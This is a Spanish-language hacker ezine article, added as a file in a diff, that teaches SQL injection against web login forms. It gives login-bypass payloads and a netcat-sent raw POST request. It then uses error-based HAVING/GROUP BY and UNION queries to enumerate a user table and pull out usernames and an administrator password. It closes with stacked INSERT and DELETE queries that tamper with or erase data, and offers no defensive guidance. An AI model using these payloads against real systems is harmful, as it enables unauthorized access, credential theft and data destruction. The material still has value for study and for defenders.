@@ -1,0 +1,325 @@
+=-[ 0x08 ]-==================================================================
+=-[ NetSearch Ezine #8 ]-====================================================
+=-[ SQL Injection ]-=========================================================
+=-[ por Chapulino ]-=========================================================
+
+
+
+
+    Indice
+
+    1- Introduccion
+    2- Herramientas
+    3- SQL injection basico
+    4- SQL injection avanzado
+    5- Despedida
+
+
+
+1-Introduccion
+  ------------
+  Hola  a todos. Antes de nada queria pedir disculpas a mis companeros porque
+  llevo bastante  tiempo sin  escribir  un articulo, pero es que no he tenido
+  tiempo y, bueno, mas vale tarde que nunca.
+
+  En este texto tratare de explicar  lo que son las inyecciones de SQL (o SQL
+  injection).  Esta no  es una tecnica nueva  pero segun he visto por la red,
+  no esta muy documentada en castellano. De forma que  intentare explicar  un
+  poco de que trata y dar algunos ejemplos para que se comprenda.
+
+
+2-Herramientas
+  ------------
+  Realmente no es necesaria ninguna herramienta para la  comprension del  SQL
+  injection pero para su  aplicacion necesitaremos, en principio,  un sniffer
+  (a mi me gusta  el NetworkActivSniffer)  para analizar  lo que  se envia al
+  servidor  HTTP  y  un  programa  para  enviar  los  datos  modificados  (yo
+  personalmente  lo  hago por  telnet  pero si  lo  prefieres puedes  usar el
+  netcat). Hay muchas formas de hacerlo y  muchos programas muy buenos por la
+  red.
+
+
+3-SQL injection (basico)
+  ----------------------
+  Para los que aun andan  perdidos ... se trata de 'abusar' de  una sentencia
+  SQL. Por ejemplo,  imaginar  la tipica  pagina  que pide login  y pass para
+  acceder a determinados sitios de la web ...
+
+                 ----------          ----------
+          login |          |   pass |          |
+                 ----------          ----------   
+
+                        ==========
+                       || Enviar ||
+                        ==========
+
+  Cuando pinchamos  en el  boton Enviar nos enviara a una pagina, normalmente
+  en PHP o ASP que hara algo similar a esto:
+
+      SELECT * FROM tUsuarios WHERE usuario = '" & request.form("login")
+      & "' AND contrasena = '" & request.form("pass") & "'"
+
+  Por  lo que  si  ponemos  como login  CHAPU y  como pass  MIPASS  intentara
+  realizar al siguiente consulta:
+
+     SELECT * FROM tUsuraios WHERE usuario='CHAPU' AND contrasena='MIPASS'
+
+  y, logicamente  devolvera 0 rows porque no  se  encuentra el  usuario en la
+  base de datos, tras lo cual se nos avisara de que el acceso es denegado.
+
+  De lo que  se  trata  es de  modificar esta  sentencia SQL, pero como? pues
+  jugando un poco  con los datos que vamos a enviar.
+  Si  pusieramos  como  nombre de  usuario  CHA'PU  nos daria un error en SQL
+  porque  el SELECT se formaria de la siguiente forma:
+
+     SELECT * FROM tUsuraios WHERE usuario='CHA'PU' AND contrasena='MIPASS'
+
+  y el servidor de BD veria que PU' no es ninguna sentencia.
+
+  Pensando un poco, podriamos intentar enviar lo siguiente:
+
+     LOGIN: ' OR usuario LIKE %
+     PASS : ' OR contrasena LIKE %
+
+  con lo cual el SELECT quedaria:
+
+     SELECT * FROM tUsuraios WHERE usuario='' OR usuario LIKE %'
+                                            ^^^^^^^^^^^^^^^^^^^
+     AND contrasena='' OR contrasena LIKE %'
+                     ^^^^^^^^^^^^^^^^^^^^^^
+
+  por  lo que  nos  devolveria  todos los  campos de  la tabla ... no nos los
+  mostraria  en pantalla,  pero el resultado  de esa  llamada seria un numero
+  mayor  que  0 (el  numero de  valores encontrados),  y  si  el ASP  (o PHP)
+  hiciera lo siguiente (como ocurre normalmente):
+
+       SI 0 rows
+          error
+       SINO
+          acceso a la pagina privada
+
+  nos dejaria pasar sin necesidad de conocer un usuario valido.
+
+  Analizando  un poco el ataque, podeis ver que he puesto <OR usuario LIKE %>
+  pero  normalmente  no conocemos  el nombre  de los  campos, de forma que en
+  lugar de  usuario podria llamarse de cualquier otra forma (login, usr, etc)
+  asi  que vamos a modificar ligeramente la sentencia a enviar:
+
+     LOGIN: ' OR 'a'='a
+     PASS : ' OR 'a'='a
+
+  por lo que el SELECT quedaria:
+
+     SELECT * FROM tUsuraios WHERE usuario='' OR 'a'='a'
+                                            ^^^^^^^^^^^
+     AND contrasena='' OR 'a'='a'
+                     ^^^^^^^^^^^
+
+  dandonos  el mismo  resultado que antes ya que la condicion 'a'='a' siempre
+  se va a cumplir.
+
+  Otra forma seria:
+
+     LOGIN: ' OR 'a'='a'--
+     PASS : x (ponemos cualquier cosa)
+
+  las -- significan comienzo de comentario, por lo que daria:
+
+     SELECT * FROM tUsuraios WHERE usuario='' OR 'a'='a'--
+                                            ^^^^^^^^^^^^^^
+  y lo  que vaya detras de -- no nos importaria puesto que se tomaria como si
+  fuera un comentario.
+
+  Y  ahora  os  preguntareis,  para que  necesitamos  las herramientas?  pues
+  porque  normalmente en el campo de formulario no os dejaran escribir mas de
+  X  caracteres  o estara  restringido  para que no se introduzcan caracteres
+  extranos.
+  Una  posibilidad  seria  descargar  la  pagina  y en  local  modificarla  y
+  ejecutarla en vuestro ordenador (para  ello debeis comprobar antes si no se
+  hacen comprobaciones del origen  de datos al enviar los datos, algo que  es
+  habitual para  evitar los falseos de este tipo) y otra ver mediante el  uso
+  de un  sniffer lo que se envia al HTTP (el POST) asi como lo que nos  manda
+  el  servidor HTTP a nosotros. Y luego, mediante netcat  o telnet  mandarlos
+  modificados.
+
+  En caso de netcat seria algo asi:
+      netcat www.web.com 80 -o salidaDatos.txt <entradaDatos.txt
+  donde  en  el  fichero entradaDatos.txt guardaremos  la sentencia a enviar,
+  que podria ser algo asi:
+
+     POST /index.asp HTTP/1.0
+     Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
+     application/x-shockwave-flash, application/vnd.ms-excel,
+     application/vnd.ms-powerpoint, application/msword, */*
+     ~~~~~~~: ~~~~:~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+     Accept-Language: es
+     Content-Type: application/x-www-form-urlencoded
+     ~~~~~~~~~~~~~~~: ~~~~~ ~~~~~~~
+     User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+     Host: www.web.com
+     Content-Length: 46
+     Connection: Keep-Alive
+     Cache-Control: no-cache
+
+     login=' OR 'a'='a&pass=' OR 'a'='a&modo=Entrar
+
+  (firajos que  en Content-Length  pongo el  numero de caracteres a enviar en
+  la linea de abajo)
+
+
+4-SQL injection (avanzado)
+  ------------------------
+  Para  cuando las tecnicas de SQL injection basico no funcionan, o si lo que
+  queremos es  estudiar la  base  de datos  y/o  sacar algunos  datos de ella
+  podemos usar  otras tecnicas  mas  avanzadas ... si os  habeis dado cuenta,
+  con  lo explicado antes  tan solo  'saltaremos' la  seguridad de  la pagina
+  pero no obtendremos ningun dato de las tablas.
+
+  Para  sacar informacion  de las tablas lo que haremos sera provocar errores
+  en  las consultas. Si por  ejemplo enviamos  un SELECT  con un  HAVING  mal
+  confeccionado  (en este caso sin el GROUP BY correcpondiente) podemos sacar
+  informacion de los errores que nos devuelve la BD:
+
+     LOGIN: ' HAVING 1=1--
+     PASS : x
+
+  al  usar incorrectamente  la orden HAVING nos devolveria un error similar a
+  este:
+
+        La columna 'clientes.id'  de la  lista  de seleccion  no  es  valida,
+        porque no esta contenida en una funcion de agregado y no hay clausula 
+        GROUP BY
+
+  bueno  :)  ...  parece  que la  tabla donde  estan almacenados los usuarios
+  se llama <clientes>  y  que  el primer campo es <id> ...  vamos a sacar mas
+  cosillas ...
+
+
+     LOGIN: ' GROUP BY clientes.id HAVING 1=1--
+     PASS : x
+
+  y nos da como resultado algo asi:
+
+        La  columna 'clientes.nombre' de la  lista de seleccion no es valida,
+        porque no esta contenida en una funcion de agregado ni en la clausula
+        GROUP BY
+
+  ahora  ya  sabemos otro campo, supuestamente donde se almacena el nombre de
+  los usuarios. Prosigamos hasta sacar el resto de campos:
+
+     LOGIN: ' GROUP BY clientes.id , clientes.nombre HAVING 1=1--
+     PASS : x
+
+  y obtendriamos:
+
+        La columna  'clientes.clave' de  la lista  de seleccion no es valida,
+        porque no esta contenida en una funcion de agregado ni en la clausula
+        GROUP BY
+
+  con  lo  que ya tenemos otro nuevo campo, donde se almacenarian los pass de
+  usuarios.  Ahora  vamos a probar de nuevo hasta que no nos de error y poder
+  sacar asi la tabla completa:
+
+     LOGIN: ' GROUP BY clientes.id , clientes.nombre, clientes.clave
+            HAVING 1=1--
+     PASS : x
+
+  en este  caso nos da como resultado 0 rows, logicamente porque no encuentra
+  ningun dato con esa busqueda,  pero  que nos sirve  para averiguar  que  la
+  orden enviada esta bien  confeccionada y  que, por lo  tanto, no quedan mas
+  campos en esa tabla.
+
+  Ahora  vamos a  proceder  a averiguar  que  tipo de  campos  son. Para ello
+  intentaremos  hacer una  suma de los datos de la tabla. Com o suponemos que
+  el campo <id> es entero, probamos con el resto:
+
+
+     LOGIN: ' UNION SELECT SUM(nombre) FROM clientes--
+     PASS : x
+
+  lo que nos daria el error:
+
+        La  operacion sum or average aggregate no puede usar el tipo de datos
+        nvarchar como argumento
+
+  que significa  que el campo <nombre> es un char. Probamos ahora con el otro
+  campo, el de la clave:
+
+     LOGIN: ' UNION SELECT SUM(clave) FROM clientes--
+     PASS : x
+
+  si  obtenemos el  mismo  resultado es  que  tambien ese campo sera un char,
+  logicamente:
+
+        La  operacion sum or average aggregate no puede usar el tipo de datos
+        nvarchar como argumento
+
+  si por el contrario hubieramos obtenido algo asi:
+
+        Todas las consultas  de una instruccion SQL que contenga un operador
+        UNION deben tener el mismo numero  de expresiones  en  sus listas de
+        destino
+
+  podriamos decir que se trata de un campo con valor numerico.
+
+  Y  ahora que  estamos entrando  en calor, vamos a ver como podemos sacar lo
+  que mas nos interesa ... los datos de los campos   :)
+  Si enviamos algo asi:
+
+     LOGIN: ' UNION SELECT MIN(nombre),1,1 FROM clientes WHERE nombre>'a'--
+     PASS : x
+
+  le  estaremos pidiendo  a la  BD  que convierta a entero el siguiente valor
+  que encuentre  en la  tabla <nombre> empezando  la  busqueda por 'a'.  Esto
+  podria devolvernos algo asi:
+
+        Error  de sintaxis  al  convertir el  valor nvarchar 'admin' para una
+        columna de tipo de datos int.
+
+  con lo que ya obtenemos un usuario ... admin
+  Si ahora  probamos a  sustituir la 'a' por 'admin' obtendremos el siguiente
+  usuario de la tabla:
+
+     LOGIN: ' UNION SELECT MIN(nombre),1,1 FROM clientes WHERE
+            nombre>'admin'--
+     PASS : x
+
+  de  forma que  podemos  obtener, poco  a poco, todos los datos de la tabla.
+  Pero, que ocurre si probamos  con el  campo <clave> en  lugar de  con el de
+  <nombre>?
+
+     LOGIN: ' UNION SELECT MIN(clave),1,1 FROM clientes WHERE clave>'a'--
+     PASS : x
+
+        Error de sintaxis al convertir el valor nvarchar 'b2E4rT65w' para una
+        columna de tipo de datos int.
+
+  pues que obtenemos la pass del administrador  :)
+
+  Otra cosa que podriamos probar es a anadir datos a la tabla:
+
+     LOGIN: '; INSERT INTO clientes VALUES (1234, 'chapulino', 'cool')--
+     PASS : x
+
+  o algo peor ... borrar datos:
+
+     LOGIN: '; DELETE FROM clientes WHERE login LIKE '%'--
+     PASS : x
+
+  La  verdad es que  se  podrian hacer muchas cosas con esto. Todo es echarle
+  imaginacion ... y estudiar bien SQL  ;)
+
+
+5- Despedida
+   ---------
+   Pues eso es todo por hoy. Espero que os haya gustado este articulo y que
+   hayais aprendido cosas nuevas, que es de lo que se trata.
+
+   Para lo que tengan dudas o quieran consultarme algo, en la direccion de
+   siempre: chapulino@netsearch-ezine.com
+
+   Chapulino
+
+
+
+0x00
